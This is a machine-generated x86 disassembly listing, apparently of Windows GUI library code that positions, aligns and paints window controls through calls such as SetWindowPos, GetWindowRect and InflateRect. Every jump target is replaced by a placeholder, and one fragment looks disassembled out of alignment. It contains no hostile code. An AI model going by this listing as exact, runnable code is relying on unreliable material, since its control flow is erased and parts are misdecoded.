call sub_412b10
mov eax edi
call sub_440438
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_4403fc
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_4437b0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_443708
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_4437e8
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_443a0c
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_443708
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403454
sub_4438a4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_413fa0
pop esi
pop ebx
retn
sub_4438c8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_4438a4
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_413e34
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_413fc0
sub_44393c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_443a0c
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_43e0d4
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_44399c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_443a00
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443a07
lea eax [ ebp - 0x4 ]
call sub_4056c4
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403454
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4056dc
sub_443a18
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43c574
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_443ad0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_413f44
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_413de8
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403454
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_443b30
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_443c26
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403454
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443c2d
mov eax [ ebp - 0x14 ]
call sub_403258
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_413fa0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_413f44
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403454
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_443c3c
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_443b30
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_443c68
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_453eac
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_443b30
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_443b30
mov edx eax
mov eax esi
call sub_457b18
sub_443cac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_440438
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4403fc
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_443cf4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4433b0
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43d190
sub_443d3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_443dc0
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_443a0c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_440438
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_444182
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_440438
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_443d3c
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4403fc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_444199
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_443dc0
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43df70
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4441d8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43edf4
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_43c888
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_444220
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f014
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_444250
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_443a0c
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_43ffa0
xor ecx ecx
push ebp
push sub_44437f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_440438
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_440438
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444386
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43ffa8
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4403fc
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_444386
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403454
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403454
jmp r-xdata
sub_44441c
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43e0d4
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43e0d4
sub_444460
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_43e0d4
sub_4444b0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_444540
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4447a6
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
